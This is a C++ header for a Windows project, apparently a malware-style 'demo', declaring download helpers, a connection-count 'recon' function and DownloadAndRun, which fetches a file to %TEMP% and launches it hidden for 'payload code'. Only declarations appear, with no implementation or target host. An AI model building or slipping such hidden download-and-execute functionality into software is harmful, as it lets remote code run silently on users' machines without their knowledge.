#pragma once

#include <windows.h>

// ============================================================
// Internet capabilities: downloads and connection snooping.
//
// DownloadFile uses URLDownloadToFileW (urlmon), which is
// synchronous and works on XP as well as W10. The demo is not a
// bot — everything here is opt-in from payload code.
// ============================================================

namespace Internet {

// true when the machine has an active internet connection.
bool IsOnline();

// Download `url` to an exact local path. true when the file
// exists afterwards.
bool DownloadFile(const wchar_t* url, const wchar_t* destPath);

// Download `url` into `folder`, keeping the URL's file name.
bool DownloadToFolder(const wchar_t* url, const wchar_t* folder);

// Download `url` to %TEMP% as `fileName`. `outPath`/`outCch`
// (optional) receive the full destination path.
bool DownloadToTemp(const wchar_t* url, const wchar_t* fileName,
	wchar_t* outPath, int outCch);

// Number of ESTABLISHED TCP connections right now (recon).
int CountEstablishedConnections();

// Download to %TEMP% and launch it hidden with optional args.
bool DownloadAndRun(const wchar_t* url, const wchar_t* args);

}